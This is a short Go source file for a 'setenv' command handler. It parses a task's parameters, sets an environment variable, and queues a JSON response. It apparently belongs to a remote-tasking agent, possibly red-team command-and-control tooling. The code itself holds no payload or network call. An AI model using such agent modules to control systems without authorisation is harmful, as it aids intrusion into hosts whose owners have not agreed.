package setenv

import (
	"fmt"
	"os"
	"strings"
	"encoding/json"
	"pkg/utils/structs"
	"sync"
	"pkg/profiles"
)

var mu sync.Mutex

//Run - Function that executes the shell command
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	if task.Params == "" {
		msg.SetError("No environment variable given to set. Must be of format:\nsetenv NAME VALUE")
		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}
	if !strings.Contains(task.Params, " ") {
		msg.SetError("Improper command format given. Must be of format:\nsetenv NAME VALUE")
		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}
	parts := strings.SplitAfterN(task.Params, " ", 2)
	parts[0] = strings.TrimSpace(parts[0])
	parts[1] = strings.TrimSpace(parts[1])

	err := os.Setenv(parts[0], parts[1])
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}
	msg.Completed = true
	msg.UserOutput = fmt.Sprintf("Set %s=%s", parts[0], parts[1])
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
